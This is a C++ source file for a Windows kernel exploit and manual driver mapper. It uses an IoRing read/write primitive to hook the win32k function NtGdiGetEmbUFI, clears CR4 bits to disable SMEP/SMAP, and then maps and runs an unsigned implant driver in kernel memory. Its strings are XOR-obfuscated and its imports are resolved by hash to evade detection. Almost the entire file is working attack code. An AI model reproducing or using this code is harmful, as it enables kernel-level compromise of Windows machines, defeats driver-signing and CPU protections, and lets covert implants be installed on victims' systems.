#include "ExploitFunctions.hpp"
#include "Console.hpp"
#include "XorStr.hpp"
#include "HasherLibrary.hpp"
#include "Timer.hpp"
#include "Signatures.hpp"

#include <iostream>
#include <filesystem>
using namespace std::chrono_literals;




namespace Exploit
{

	void DriverMapMain::LibLoader()
	{

		auto libCallPtr = std::weak_ptr(this->libCall);
		auto safetyPtr = std::weak_ptr(this->safetyChecks);
		this->libLoader = std::make_shared<LibraryLoader>(&safetyPtr.lock()->libLoaderinitCheck);
		if (!safetyPtr.lock()->libLoaderinitCheck)
		{
			libCallPtr.lock()->closeThread = true;
			safetyPtr.lock()->libLoaderReady = false;
		}


		safetyPtr.lock()->libLoaderReady = true;
		///main loop
		while (true)
		{


			if (libCallPtr.lock()->loadImage == true && !libCallPtr.lock()->imageName.empty())
			{
				
				libCallPtr.lock()->mappedImageBase = libLoader.get()->CustomLoadLibrary(libCallPtr.lock()->imageName.data(), &libCallPtr.lock()->szImage, 
					libCallPtr.lock()->isFilePath, libCallPtr.lock()->fileFlag, libCallPtr.lock()->loadFlag);

				if (libCallPtr.lock()->mappedImageBase)
				{
					libCallPtr.lock()->loadImage = false;
					libCallPtr.lock()->imageName.clear();
				}
				else
				{
					std::wcout << dye.red << xorstr_(L"[!]") << dye.reset << xorstr_(L"Library Loader : Failed To Load : ") << libCallPtr.lock()->imageName.data() << "\n";
					libCallPtr.lock()->imageName.clear();
				}

				safetyPtr.lock()->libLoaderReady = true;
			}



			if (libCallPtr.lock()->loadFunction == true && libCallPtr.lock()->hashedprocName != 0)
			{

				libCallPtr.lock()->procPtr = libLoader.get()->FunctionAddrUtil(libCallPtr.lock()->functionImageBase, 0, libCallPtr.lock()->hashedprocName);
				if (libCallPtr.lock()->procPtr)
				{
					libCallPtr.lock()->loadFunction = false;
					libCallPtr.lock()->functionImageBase = nullptr;
					libCallPtr.lock()->hashedprocName = 0;
				}
				else
				{
					CPrintError(xorstr_("Library Loader"), xorstr_("Failed To Fetch Function Pointer"))
					libCallPtr.lock()->loadFunction = false;
					libCallPtr.lock()->functionImageBase = nullptr;
					libCallPtr.lock()->hashedprocName = 0;
				}

				safetyPtr.lock()->libLoaderReady = true;
			}



			if (libCallPtr.lock()->closeThread == true)
			{
				safetyPtr.lock()->libLoaderReady = false;
				break;
			}
		}

		CPrint(xorstr_("Library Loader"), xorstr_("Closing Library Loader thread"));
		safetyPtr.lock()->libLoaderclosed = true;
		return;
	}



	bool DriverMapMain::KernelFunctionHook(__in ULONG64 kernelAddrPtr, __in void* targetFunction, __in void* Param1, __in void* Param2)
	{
		auto kImplantPtr = std::weak_ptr(this->KernelImplant);
		auto libCallPtr = std::weak_ptr(this->libCall);
		auto safetyPtr = std::weak_ptr(this->safetyChecks);
		auto hookInfoPtr = std::weak_ptr(this->hookInfo);
		bool status = false;

		CAppendedPrint(xorstr_("IoRing"), xorstr_("Fetching Function Pointer..."))


		if (!kImplantPtr.lock()->IoRingReadHelper(kernelAddrPtr, &hookInfoPtr.lock()->usermodehookAddr, sizeof(ULONG_PTR)))
		{
			CAppendedPrintError(xorstr_("IoRing"), xorstr_("Failed To Fetch Function Pointer"))
			return false;
		}
		else
			CPrintVariable(xorstr_("Function Pointer Located At"), U_PTR(hookInfoPtr.lock()->usermodehookAddr))



		if (!hookInfoPtr.lock()->hookedFunction)
		{
			libCallPtr.lock()->imageName = xorstr_(L"win32u.dll");
			libCallPtr.lock()->loadImage = true;

			while (!safetyPtr.lock()->libLoaderReady)
			{
				std::this_thread::yield();
			}

			hookInfoPtr.lock()->win32UBase = libCallPtr.lock()->mappedImageBase;
			libCallPtr.lock()->mappedImageBase = nullptr;
			if (!hookInfoPtr.lock()->win32UBase)
			{
				return false;
			}


			libCallPtr.lock()->loadFunction = true;
			libCallPtr.lock()->hashedprocName = HASHSTRA("NtGdiGetEmbUFI");
			libCallPtr.lock()->functionImageBase = hookInfoPtr.lock()->win32UBase;

			while (!safetyPtr.lock()->libLoaderReady)
			{
				std::this_thread::yield();
			}

			*(void**)&hookInfoPtr.lock()->hookedFunction = libCallPtr.lock()->procPtr;
			libCallPtr.lock()->procPtr = nullptr;


			if (!hookInfoPtr.lock()->hookedFunction)
			{
				return false;
			}

		}

		CPrint(xorstr_("IoRing"), xorstr_("Calling Hooked Function"))

		hookInfoPtr.lock()->hookedFunction(Param1, Param2);


		CAppendedPrint(xorstr_("IoRing"), xorstr_("Restoring Original Function..."))

		if (!kImplantPtr.lock()->IoRingWriteHelper(kernelAddrPtr, &hookInfoPtr.lock()->usermodehookAddr, sizeof(ULONG_PTR)))
		{
			CPrintError(xorstr_("IoRing"), xorstr_("Failed To Restore Function Pointer"))
				return false;
		}

		CPrintBland(xorstr_("Successful"));
		return true;
	}



	///for driver mapping - these will be run in kernel with CPL0 
	__forceinline int DriverMapMain::kernelStrComp(const char* string1, const char* string2)
	{
		while (*string1 && *string1 == *string2)
		{
			++string1;
			++string2;
		}
		return ((int)((UCHAR)*string1) - (int)((UCHAR)*string2));
	}

	__forceinline void DriverMapMain::KernelMemCopy(void* destination, void* source, SIZE_T length)
	{
		auto cpySource = (PBYTE)source;
		auto cpyDestination = (PBYTE)destination;
		SIZE_T it = 0;

		while (it < length)
		{
			cpyDestination[it] = cpySource[it];
			it++;
		}
	}



	__forceinline ULONG_PTR DriverMapMain::ResolveExport(__in void* kernelBase, __in const char* procName)
	{
		if (!kernelBase || !procName)
		{
			return 0;
		}

		auto pBase = (PBYTE)kernelBase;

		auto dosHeader = (PIMAGE_DOS_HEADER)(pBase);
		if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return 0;

		auto ntHeader = (PIMAGE_NT_HEADERS64)(pBase + dosHeader->e_lfanew);
		if (ntHeader->Signature != IMAGE_NT_SIGNATURE) return 0;

		auto exportDirPtr = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
		if (!exportDirPtr) return 0;


		auto szExportDir = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
		if (!szExportDir) return 0;

		auto exportDir = (PIMAGE_EXPORT_DIRECTORY)C_PTR((U_PTR(kernelBase) + exportDirPtr));

		auto  nameArray = (PDWORD)(pBase + exportDir->AddressOfNames);
		auto ordinal = (PWORD)(pBase + exportDir->AddressOfNameOrdinals);
		auto  addressArray = (PDWORD)(pBase + exportDir->AddressOfFunctions);


		for (DWORD i = 0; i < exportDir->NumberOfNames; i++)
		{
			auto name = (char*)(pBase + nameArray[i]);
			auto pFunctionAddress = U_PTR((pBase + addressArray[ordinal[i]]));


			if (name && kernelStrComp(procName, name) == 0)
			{
				return pFunctionAddress;
			}
		}

		return 0;
	}


	void MapKernelHook(void* Param1, void* Param2)
	{
		UNREFERENCED_PARAMETER(Param1);
		UNREFERENCED_PARAMETER(Param2);


		std::weak_ptr mapInfoPtr = std::weak_ptr(KDMapper.mapInfo);
		mapInfoPtr.lock()->kernelCallbackCalled = true;

		auto pMmAllocateContiguousMemoryEx = (fnMmAllocateContiguousMemoryEx)KDMapper.ResolveExport(mapInfoPtr.lock()->kernelBase, xorstr_("MmAllocateContiguousMemoryEx"));

		auto pBase = (PBYTE)(mapInfoPtr.lock()->driverBuffer);
		auto dosHeader = (PIMAGE_DOS_HEADER)(pBase);
		if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return;

		auto ntHeader = (PIMAGE_NT_HEADERS64)(pBase + dosHeader->e_lfanew);
		if (ntHeader->Signature != IMAGE_NT_SIGNATURE) return;

		auto lowAddr = std::make_unique<PHYSICAL_ADDRESS>();
		auto highAddr = std::make_unique<PHYSICAL_ADDRESS>();


		lowAddr.get()->QuadPart = 0x800000;
		highAddr.get()->QuadPart = 0x1E0A6E0;


		std::size_t szMapSize = mapInfoPtr.lock()->szDriverBuffer;
		NTSTATUS status = 1;
		void* kernelBuffer = nullptr;
		if (!NT_SUCCESS(status = pMmAllocateContiguousMemoryEx(&szMapSize, *lowAddr.get(), *highAddr.get(), *lowAddr.get(),
			MM_ANY_NODE_OK, PAGE_READWRITE | PAGE_NOCACHE, nullptr, 0x6D756C50,
			MM_ALLOCATE_FULLY_REQUIRED | MM_ALLOCATE_REQUIRE_CONTIGUOUS_CHUNKS, &kernelBuffer)))
		{
			return;
		}

		KDMapper.KernelMemCopy(kernelBuffer, pBase, ntHeader->OptionalHeader.SizeOfHeaders);

		auto sectionHeader = IMAGE_FIRST_SECTION(ntHeader);

		for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++, sectionHeader++)
		{
			if ((sectionHeader->Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) > 0) continue;

			auto localSection = C_PTR((U_PTR(kernelBuffer) + sectionHeader->VirtualAddress));
			auto remoteSection = C_PTR((U_PTR(pBase) + sectionHeader->VirtualAddress));
			KDMapper.KernelMemCopy(localSection, remoteSection, sectionHeader->SizeOfRawData);

		}

		auto iatPtr = &ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
		if (!iatPtr->VirtualAddress) return;

		auto iatDir = (PIMAGE_IMPORT_DESCRIPTOR)(C_PTR(OffsetToPointer(kernelBuffer, iatPtr)));

		for (; iatDir->FirstThunk; ++iatDir)
		{
			auto firstThunk = (PIMAGE_THUNK_DATA64)(C_PTR(OffsetToPointer(kernelBuffer, iatDir->FirstThunk)));
			auto originThunk = (PIMAGE_THUNK_DATA64)(C_PTR(OffsetToPointer(kernelBuffer, iatDir->OriginalFirstThunk)));

			for (; originThunk->u1.AddressOfData; ++originThunk, ++firstThunk)
			{
				auto Name = ((PIMAGE_IMPORT_BY_NAME)(C_PTR((U_PTR(kernelBuffer) + originThunk->u1.AddressOfData))))->Name;
				ULONG_PTR function = KDMapper.ResolveExport(mapInfoPtr.lock()->kernelBase, Name);
				if (function == 0)
				{
					mapInfoPtr.lock()->mapStatus = STATUS_ASSERTION_FAILURE;
					return;
				}
				firstThunk->u1.Function = function;
			}
		}

		auto relocDir = &ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
		if (relocDir->VirtualAddress)
		{
			auto baseReloc = (PIMAGE_BASE_RELOCATION)(C_PTR(OffsetToPointer(kernelBuffer, relocDir->VirtualAddress)));
			auto szRelocDir = relocDir->Size;
			auto offset = PointerToOffset(kernelBuffer, mapInfoPtr.lock()->driverBuffer);



			while (U_PTR(U_PTR(baseReloc) < U_PTR(OffsetToPointer(kernelBuffer, relocDir) + szRelocDir)) &&
				U_PTR(baseReloc->VirtualAddress != 0))
			{
				auto reloc = C_PTR((U_PTR(baseReloc) + 1));
				auto endOfReloc = C_PTR(OffsetToPointer(baseReloc, baseReloc->SizeOfBlock));

				while (reloc < endOfReloc)
				{
					auto address = C_PTR(OffsetToPointer(baseReloc->VirtualAddress, ((PIMAGE_RELOC)reloc)->Offset));
					if (U_PTR(address) < szMapSize)
					{
						address = C_PTR((U_PTR(kernelBuffer) + baseReloc->VirtualAddress + ((PIMAGE_RELOC)reloc)->Offset));

						if (((PIMAGE_RELOC)reloc)->Type == IMAGE_REL_BASED_ABSOLUTE) continue;
						else if (((PIMAGE_RELOC)reloc)->Type == IMAGE_REL_BASED_DIR64) C_DEF64(address) += U_PTR64(offset);

					}

					reloc = static_cast<PBYTE>(reloc) + 1;
				}

				baseReloc = (PIMAGE_BASE_RELOCATION)reloc;
			}
		}


		auto driverEntry = (DRIVER_INITALIZE)OffsetToPointer(kernelBuffer, ntHeader->OptionalHeader.AddressOfEntryPoint);
		if (!driverEntry) return;

		mapInfoPtr.lock()->driverStatus = driverEntry((void*)0x1CEC0A1ED, (void*)0xC0A1EDA51CE);
		mapInfoPtr.lock()->mapStatus = STATUS_SUCCESS;
	}






	void DriverMapMain::IoRing()
	{
		auto libCallPtr = std::weak_ptr(this->libCall);
		auto safetyPtr = std::weak_ptr(this->safetyChecks);
		auto mapInfoPtr = std::weak_ptr(this->mapInfo);
		auto hookInfoPtr = std::weak_ptr(this->hookInfo);	
		PIORING_OBJECT ioRingObj = nullptr;
		PIMAGE_NT_HEADERS64 ntHeader = nullptr;
		std::wstring driverFile = xorstr_(L"\\??\\C:\\Users\\peter\\Desktop\\IceCoaledImplant.sys");
		HRESULT status = 1;

		this->KernelImplant = std::make_shared<IoRingExploit>(&safetyPtr.lock()->kernelImplantInitCheck);

		if (!safetyPtr.lock()->kernelImplantInitCheck ||
			!safetyPtr.lock()->libLoaderinitCheck)
		{

			CPrintError(xorstr_("IoRing"), xorstr_("Closing Driver Map Thread, Due To Error"))
			goto close;
		}


		

		CPrint(xorstr_("IoRing"), xorstr_("Mapping Driver In Memory..."))

		libCallPtr.lock()->loadFlag = MapDataOnly;
		libCallPtr.lock()->isFilePath = true;
		libCallPtr.lock()->loadImage = true;
		libCallPtr.lock()->imageName = driverFile;
		safetyPtr.lock()->libLoaderReady = false;


		while (!safetyPtr.lock()->libLoaderReady)
		{
			std::this_thread::yield();
		}

		if (!libCallPtr.lock()->mappedImageBase)
		{
			CPrintError(xorstr_("IoRing"), xorstr_("Closing Driver Map Thread, Due To Error"))
			goto close;
		}
		else
		{
			mapInfoPtr.lock()->driverBuffer = libCallPtr.lock()->mappedImageBase;
			libCallPtr.lock()->mappedImageBase = nullptr;
			CPrintVariable(xorstr_("Success, Driver Image At"), mapInfoPtr.lock()->driverBuffer)
		}




		ntHeader = this->KernelImplant.get()->FetchNtHeaderUtil(mapInfoPtr.lock()->driverBuffer);
		if (ntHeader->Signature != IMAGE_NT_SIGNATURE)
		{
			CPrintError(xorstr_("IoRing"), xorstr_("Closing Driver Map Thread, Due To Error"))
				goto close;
		}



		CPrint(xorstr_("IoRing"), xorstr_("Fetching Kernel Base..."))
		mapInfoPtr.lock()->kernelBase = this->KernelImplant.get()->FetchModuleBaseUtil(HASHSTRW(xorstr_(L"ntoskrnl.exe")));
		if (!mapInfoPtr.lock()->kernelBase)
		{
			CPrintError(xorstr_("IoRing"), xorstr_("Closing Driver Map Thread, Due To Error"))
				goto close;
		}
		CPrintVariable(xorstr_("Success, Kernel Base At"), mapInfoPtr.lock()->kernelBase);



		CPrint(xorstr_("IoRing"), xorstr_("Fetching Kernel Win32k Base..."))
		mapInfoPtr.lock()->win32kBase = this->KernelImplant.get()->FetchModuleBaseUtil(HASHSTRW(xorstr_(L"win32k.sys")));
		if (!mapInfoPtr.lock()->win32kBase)
		{
			CPrintError(xorstr_("IoRing"), xorstr_("Closing Driver Map Thread, Due To Error"))
				goto close;
		}
		CPrintVariable(xorstr_("Success, Win32k Base At"), mapInfoPtr.lock()->win32kBase);



		CPrint(xorstr_("IoRing"), xorstr_("Mapping Ntoskrl In Memory..."))
		libCallPtr.lock()->loadFlag = LoadForData;
		libCallPtr.lock()->fileFlag = FileIsExe;
		libCallPtr.lock()->isFilePath = false;
		libCallPtr.lock()->imageName = xorstr_(L"ntoskrnl.exe");
		libCallPtr.lock()->loadImage = true;
		safetyPtr.lock()->libLoaderReady = false;

		while (!safetyPtr.lock()->libLoaderReady)
		{
			std::this_thread::yield();
		}

		if (!libCallPtr.lock()->mappedImageBase)
		{
			CPrintError(xorstr_("IoRing"), xorstr_("Closing Driver Map Thread, Failed to Map Ntoskrl Locally"))
			goto close;
		}
		else
		{
			mapInfoPtr.lock()->mappedNtoskrnlBase = libCallPtr.lock()->mappedImageBase;
			mapInfoPtr.lock()->szMappedNtoskrnl = libCallPtr.lock()->szImage;
			libCallPtr.lock()->mappedImageBase = nullptr;
			libCallPtr.lock()->szImage = 0;
			CPrintVariable(xorstr_("Success, local Kernel Base At"), mapInfoPtr.lock()->mappedNtoskrnlBase)
		}



		CPrint(xorstr_("IoRing"), xorstr_("Mapping Win32k In Memory..."))
		libCallPtr.lock()->loadImage = true;
		libCallPtr.lock()->loadFlag = LoadForData;
		libCallPtr.lock()->fileFlag = FileIsExe;
		libCallPtr.lock()->imageName = xorstr_(L"win32k.sys");
		libCallPtr.lock()->isFilePath = false;
		safetyPtr.lock()->libLoaderReady = false;
		
		while (!safetyPtr.lock()->libLoaderReady)
		{
			std::this_thread::yield();
		}

		if (!libCallPtr.lock()->mappedImageBase)
		{
			CPrintError(xorstr_("IoRing"), xorstr_("Closing Driver Map Thread, Failed to Map Win32k Locally"))
			goto close;
		}
		else
		{
			mapInfoPtr.lock()->mappedWin32kBase = libCallPtr.lock()->mappedImageBase;
			mapInfoPtr.lock()->szMappedWin32k = libCallPtr.lock()->szImage;
			libCallPtr.lock()->mappedImageBase = nullptr;
			libCallPtr.lock()->szImage = 0;
			CPrintVariable(xorstr_("Success, Local Win32k Base At"), mapInfoPtr.lock()->win32kBase)
		}


		CPrint(xorstr_("IoRing"), xorstr_("Fetching Cr4 Write Address..."))
		hookInfoPtr.lock()->writeCr4Addr = U_PTR(this->KernelImplant.get()->SigScannerUtil(mapInfoPtr.lock()->mappedNtoskrnlBase, mapInfoPtr.lock()->szMappedNtoskrnl, Sigs.writeCr4Signature.DecryptSig(), Sigs.writeCr4Signature.Size()));
		
		if (!hookInfoPtr.lock()->writeCr4Addr)
		{
			CPrintError(xorstr_("IoRing"), xorstr_("Closing Driver Map Thread, Failed To Fetch Cr4 Write Address"))
			goto close;
		}
		else
		{
			hookInfoPtr.lock()->writeCr4Addr = OffsetToPointer(hookInfoPtr.lock()->writeCr4Addr, mapInfoPtr.lock()->kernelBase);
			hookInfoPtr.lock()->writeCr4Addr = PointerToOffset(hookInfoPtr.lock()->writeCr4Addr, mapInfoPtr.lock()->mappedNtoskrnlBase);
			CPrintVariable(xorstr_("Success, Cr4 Write Address At"), hookInfoPtr.lock()->writeCr4Addr)
		}


		CPrint(xorstr_("IoRing"), xorstr_("Fetching Kernel Rdx Jump Address..."))
		hookInfoPtr.lock()->rdxJumpAddr = U_PTR(this->KernelImplant.get()->SigScannerUtil(mapInfoPtr.lock()->mappedNtoskrnlBase, mapInfoPtr.lock()->szMappedNtoskrnl, Sigs.rdxJmpCodeSignature.DecryptSig(), Sigs.rdxJmpCodeSignature.Size()));
		if (!hookInfoPtr.lock()->rdxJumpAddr)
		{
			CPrintError(xorstr_("IoRing"), xorstr_("Closing Driver Map Thread, Due To Error"))
			goto close;
		}
		else
		{
			hookInfoPtr.lock()->rdxJumpAddr = OffsetToPointer(hookInfoPtr.lock()->rdxJumpAddr, mapInfoPtr.lock()->kernelBase);
			hookInfoPtr.lock()->rdxJumpAddr = PointerToOffset(hookInfoPtr.lock()->rdxJumpAddr, mapInfoPtr.lock()->mappedNtoskrnlBase);
		}
		CPrintVariable(xorstr_("Success, Rdx Jump At"), hookInfoPtr.lock()->rdxJumpAddr);



		CPrint(xorstr_("IoRing"), xorstr_("Fetching Kernel Function To Hook Address..."))
			hookInfoPtr.lock()->kernelHookAddr = U_PTR(this->KernelImplant.get()->SigScannerUtil(mapInfoPtr.lock()->mappedWin32kBase, mapInfoPtr.lock()->szMappedWin32k, Sigs.ntGdiGetEmbUFISignature.DecryptSig(), Sigs.ntGdiGetEmbUFISignature.Size()));
		if (!hookInfoPtr.lock()->kernelHookAddr)
		{
			CPrintError(xorstr_("IoRing"), xorstr_("Closing Driver Map Thread, Due To Error"))
			goto close;
		}
		else
		{
			hookInfoPtr.lock()->kernelHookAddr = OffsetToPointer(hookInfoPtr.lock()->kernelHookAddr, mapInfoPtr.lock()->win32kBase);
			hookInfoPtr.lock()->kernelHookAddr = PointerToOffset(hookInfoPtr.lock()->kernelHookAddr, mapInfoPtr.lock()->mappedWin32kBase);
			CPrintVariable(xorstr_("Success, Hook Address At"), hookInfoPtr.lock()->kernelHookAddr)
		}



		CPrint(xorstr_("IoRing"), xorstr_("Fetching Cr4 Read Address..."))
		hookInfoPtr.lock()->readCr4Addr = U_PTR(this->KernelImplant.get()->SigScannerUtil(mapInfoPtr.lock()->mappedNtoskrnlBase, mapInfoPtr.lock()->szMappedNtoskrnl, Sigs.readCr4Signature.DecryptSig(), Sigs.readCr4Signature.Size()));
		if (!hookInfoPtr.lock()->readCr4Addr)
		{
			CPrintError(xorstr_("IoRing"), xorstr_("Closing Driver Map Thread, Failed To Fetch Cr4 Read Address"))
			goto close;
		}
		else
		{
			hookInfoPtr.lock()->readCr4Addr = OffsetToPointer(hookInfoPtr.lock()->readCr4Addr, mapInfoPtr.lock()->kernelBase);
			hookInfoPtr.lock()->readCr4Addr = PointerToOffset(hookInfoPtr.lock()->readCr4Addr, mapInfoPtr.lock()->mappedNtoskrnlBase);
			CPrintVariable(xorstr_("Success, Cr4 Read Address At"), hookInfoPtr.lock()->readCr4Addr)
		}



		CPrint(xorstr_("IoRing"), xorstr_("Setting IoRing Exploit..."))
		if (!this->KernelImplant.get()->IoRingSetup(&ioRingObj))
		{
			CPrintError(xorstr_("IoRing"), xorstr_("Closing Driver Map Thread, Due To Error"))
				goto close;
		}

		if (!this->KernelImplant.get()->WriteExploit((PCHAR)&ioRingObj->RegBuffers + 0x3, Sigs.extendedAttributesSignature.DecryptSig(), Sigs.extendedAttributesSignature.Size()))
		{
			CPrintError(xorstr_("IoRing"), xorstr_("Closing Driver Map Thread, Due To Error"))
				goto close;
		}

		if (!this->KernelImplant.get()->WriteExploit((PCHAR)&ioRingObj->RegBuffersCount, Sigs.extendedAttributesSignature.Get(), Sigs.extendedAttributesSignature.Size()))
		{
			CPrintError(xorstr_("IoRing"), xorstr_("Closing Driver Map Thread, Due To Error"))
				goto close;
		}
		CPrintBland(xorstr_("Successful, IoRing Setup"))



		CPrint(xorstr_("IoRing"), xorstr_("Fetching Cr4 Value..."))
		if (!KernelFunctionHook(hookInfoPtr.lock()->kernelHookAddr, C_PTR(hookInfoPtr.lock()->readCr4Addr), 0x0, C_PTR(hookInfoPtr.lock()->originalCr4)))
		{
			CPrintError(xorstr_("IoRing"), xorstr_("Closing Driver Map Thread, Failed To Fetch Cr4 Value"))
			this->KernelImplant.get()->IoRingRundownProtection();
			goto close;
		}
		else
		{
			CPrintVariable(xorstr_("Success, Current Cr4"), hookInfoPtr.lock()->originalCr4)
			CPrint(xorstr_("IoRing"), xorstr_("Disabling SMEP/SMAP..."))
			hookInfoPtr.lock()->modifiedCr4 = hookInfoPtr.lock()->originalCr4;
			hookInfoPtr.lock()->modifiedCr4 &= ~(1ULL << 20ULL); // Disable SMEP
			hookInfoPtr.lock()->modifiedCr4 &= ~(1ULL << 21ULL); // Disable SMAP

			if (!KernelFunctionHook(hookInfoPtr.lock()->kernelHookAddr, C_PTR(hookInfoPtr.lock()->writeCr4Addr), C_PTR(hookInfoPtr.lock()->modifiedCr4), 0x0))
			{
				CPrintError(xorstr_("IoRing"), xorstr_("Closing Driver Map Thread, Failed To Write Cr4 Value"))
				this->KernelImplant.get()->IoRingRundownProtection();
				goto close;
			}
			CPrintBland(xorstr_("Success, SMEP/SMAp Disabled"))
		}

		

		CPrint(xorstr_("IoRing"), xorstr_("Mapping Driver..."));
		if (!KernelFunctionHook(hookInfoPtr.lock()->kernelHookAddr, C_PTR(hookInfoPtr.lock()->rdxJumpAddr), 0x0, C_PTR(MapKernelHook)))
		{
			CPrintError(xorstr_("IoRing"), xorstr_("Closing Driver Map Thread, Due To Error"))
			this->KernelImplant.get()->IoRingRundownProtection();
			goto close;
		}
		else
		{
			if (NT_SUCCESS(mapInfoPtr.lock()->mapStatus))
			{
				CPrintVariable(xorstr_("Success, Driver Initialization Status"), mapInfoPtr.lock()->driverStatus);
			}
			else
			{
				CPrintVariable(xorstr_("Unsuccessful, Driver Initialization Status"), mapInfoPtr.lock()->driverStatus);
			}
		}


		CPrint(xorstr_("IoRing"), xorstr_("Restoring Original Cr4 Value..."));
		if (!KernelFunctionHook(hookInfoPtr.lock()->kernelHookAddr, C_PTR(hookInfoPtr.lock()->writeCr4Addr), C_PTR(hookInfoPtr.lock()->originalCr4), 0x0))
		{
			CPrintError(xorstr_("IoRing"), xorstr_("Closing Driver Map Thread, Failed To Write Cr4 Value"))
				this->KernelImplant.get()->IoRingRundownProtection();
			goto close;
		}


		this->KernelImplant.get()->IoRingRundownProtection();
		CPrintBland(xorstr_("Success, Restored Cr4"))

		close:
		libCallPtr.lock()->closeThread = true;
		while (!safetyPtr.lock()->libLoaderReady);
		{
			std::this_thread::yield();
		}

		CPrint(xorstr_("IoRing"), xorstr_("Closing Kernel Driver Map thread"));
	}




	bool DriverMapMain::Decryption()
	{
		void* cryptspBase = nullptr;
		void* pSystemFunction033Ptr = nullptr;
		auto libCallPtr = std::weak_ptr(this->libCall);
		auto safetyPtr = std::weak_ptr(this->safetyChecks);


		CPrint(xorstr_("Main"), xorstr_("Mapping Cryptsp In Memory..."));
		libCallPtr.lock()->loadFlag = LoadWithExecute;
		libCallPtr.lock()->fileFlag = FileIsDll;
		libCallPtr.lock()->imageName = xorstr_(L"cryptsp.dll");
		libCallPtr.lock()->loadImage = true;
		safetyPtr.lock()->libLoaderReady = false;

		while (!safetyPtr.lock()->libLoaderReady)
		{
			std::this_thread::yield();
		}
		
		cryptspBase = libCallPtr.lock()->mappedImageBase;
		libCallPtr.lock()->mappedImageBase = nullptr;
		libCallPtr.lock()->szImage = 0;
		if (!cryptspBase)
		{
			CPrintError(xorstr_("Main"), xorstr_("Closing Decryptor Thread Due To Error"))
			return false;
		}
		CPrintVariable(xorstr_("Success, Cryptsp Base At"), cryptspBase);
		

		CPrint(xorstr_("Main"), xorstr_("Fetching SystemFunction033 Pointer..."));
		libCallPtr.lock()->functionImageBase = cryptspBase;
		libCallPtr.lock()->loadFunction = true;
		libCallPtr.lock()->hashedprocName = HASHSTRA(xorstr_("SystemFunction033"));
		safetyPtr.lock()->libLoaderReady = false;

		while (!safetyPtr.lock()->libLoaderReady)
		{
			std::this_thread::yield();
		}

		pSystemFunction033Ptr = libCallPtr.lock()->procPtr;
		libCallPtr.lock()->procPtr = nullptr;
		if (!pSystemFunction033Ptr)
		{
			CPrintError(xorstr_("Main"), xorstr_("Failed TO Fetch Function Pointer"))
			return false;
		}
		CPrintVariable(xorstr_("Success, SystemFunction033 Function At"), pSystemFunction033Ptr);
		
		Sigs.systemFunction032Ptr = pSystemFunction033Ptr;

		CPrint(xorstr_("Main"), xorstr_("All Patterns Are Ready For Use"));
		return true;
	}


	void DriverMapMain::RunDriverMap()
	{

		auto libLoaderThread = std::make_unique<std::jthread>(&DriverMapMain::LibLoader, this);
		libLoaderThread.get()->detach();
		
		auto safetyPtr = std::weak_ptr(this->safetyChecks);
		auto libCallPtr = std::weak_ptr(this->libCall);

		
		auto timer = std::make_unique<cTimer>();
		timer.get()->Start();
		
		
		while (!safetyPtr.lock()->libLoaderReady)
		{
	
			std::this_thread::yield();
			if (timer.get()->TimeElapsed() == 2)
			{
				safetyPtr.lock()->libLoaderReady = false;
				libCallPtr.lock()->closeThread = true;
				return;
			}
		}
		timer.get()->End();

		std::this_thread::sleep_for(3000ms);
		system("CLS");
	
		if (!DriverMapMain::Decryption()) return;

		std::this_thread::sleep_for(3000ms);
		system("CLS");

		auto kernelExploitThread = std::make_unique<std::jthread>(&DriverMapMain::IoRing, this);	
		kernelExploitThread.get()->detach();
	
		while (true)
		{
			if (kernelExploitThread.get()->joinable()) break;
		}

	close:
		return;
	}

};









